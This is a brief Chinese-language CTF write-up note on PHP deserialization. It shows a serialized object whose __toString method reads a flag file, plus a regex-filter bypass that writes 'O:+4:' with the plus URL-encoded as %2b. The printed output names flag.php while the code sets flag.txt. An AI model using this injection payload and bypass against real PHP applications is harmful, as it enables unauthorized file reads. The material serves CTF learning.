# Unserialize

## 序列化

```php
class what {
    public $filename;
    var $text;
    function __toString() {
        return @file_get_contents($this->filename);
    }
}
$a = new what();
$a->filename = "flag.txt";
$a->text = "??!!@@$$5%%???";
$param = serialize($a);
echo $param;
```

O:4:"what":2:{s:8:"filename";s:8:"flag.php";s:4:"text";s:14:"??!!@@$$5%%???";}

## 正则

```php
!(bool)preg_match("/^O:[0-9]+:/s", $param);
```

O:+4:...绕过

由于在url中+会被识别为空格，故需用+的url编码%2b替换，即O:%2b4:...

原理： http://www.phpbug.cn/archives/32.html